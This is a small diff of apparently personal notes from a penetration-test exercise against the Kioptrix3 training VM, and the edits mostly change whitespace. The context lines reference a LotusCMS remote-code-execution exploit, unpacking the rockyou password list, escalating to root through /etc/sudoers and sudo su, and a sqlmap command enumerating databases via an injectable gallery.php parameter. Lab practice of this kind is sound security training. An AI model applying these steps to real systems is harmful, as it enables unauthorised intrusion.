@@ -44,14 +44,14 @@ https://github.com/Hood3dRob1n/LotusCMS-Exploit/blob/master/lotusRCE.sh
 root@kali:~# cd /usr/share/wordlists/
 root@kali:/usr/share/wordlists# gunzip rockyou.txt.gz 
 
-loneferret@Kioptrix3:~$ export TERM=xterm 
-Update: /etc/sudoers 
-Then sudo su
+loneferret@Kioptrix3:~$ export TERM=xterm   
+Update: /etc/sudoers   
+Then sudo su  
 
-Other method:
-add hostname, 
+Other method:  
+add hostname,   
 
-http://kioptrix3.com/gallery/
+http://kioptrix3.com/gallery/  
 
 Search db:
 sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1" --dbs
